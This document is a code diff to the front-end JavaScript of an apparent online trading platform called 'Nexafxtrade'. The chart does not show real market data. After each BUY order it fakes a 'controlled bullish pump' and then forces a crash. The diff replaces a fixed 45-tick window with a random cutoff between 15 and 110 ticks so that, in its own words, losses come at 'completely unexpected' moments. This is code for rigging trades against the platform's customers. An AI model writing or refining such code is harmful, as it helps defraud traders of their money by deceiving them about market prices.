@@ -11,7 +11,6 @@ const socket = io();
 // --- DYNAMIC POSITION MANAGEMENT STATE ---
 let activeTradePosition = null; 
 let tradeTicksElapsed = 0;       
-const SAFE_GROWTH_TICKS = 45;   // Approximately 6.7 seconds of safe pump timeline based on standard refresh loops
 
 // 2. LIVE GRAPH CONFIGURATION (Nexafxtrade Market Waves)
 const ctx = document.getElementById('tradeChart').getContext('2d');
@@ -69,7 +68,8 @@ socket.on('market-update', (data) => {
     if (activeTradePosition) {
         tradeTicksElapsed++;
 
-        if (tradeTicksElapsed <= SAFE_GROWTH_TICKS) {
+        // References the specific randomized drop cutoff assigned to this trade position instance
+        if (tradeTicksElapsed <= activeTradePosition.customizedLossThreshold) {
             // PHASE 1: Controlled Bullish Pump. Push market wave upward systematically.
             let simulatedPump = Math.abs(rateValue) * 0.12 + 0.015;
             rateValue = Math.abs(rateValue) + simulatedPump;
@@ -195,14 +195,20 @@ if (buyBtn) {
         
         // Setup initial client-side hooks inside synchronization loops
         tradeTicksElapsed = 0;
+
+        // Generates completely unexpected loss windows on every unique order execution
+        // Selection chooses a random lifecycle tick parameter between 15 ticks (~2.2s) and 110 ticks (~16.5s)
+        let randomThresholdRoll = Math.floor(Math.random() * (110 - 15 + 1)) + 15;
+
         activeTradePosition = {
             stake: parseFloat(amount),
             entryPrice: chartData[chartData.length - 1] || 0.00,
-            targetAmount: parseFloat(amount) * 1.85
+            targetAmount: parseFloat(amount) * 1.85,
+            customizedLossThreshold: randomThresholdRoll // Safely locked to this specific order instance
         };
 
         socket.emit('place-trade', { type: 'BUY', amount: amount, timestamp: Date.now() });
-        console.log("Nexafxtrade: BUY order emitted. Target lock engaged.");
+        console.log(`Nexafxtrade: BUY order emitted. Crash target engine locked at tick frame: ${randomThresholdRoll}`);
     };
 }
 
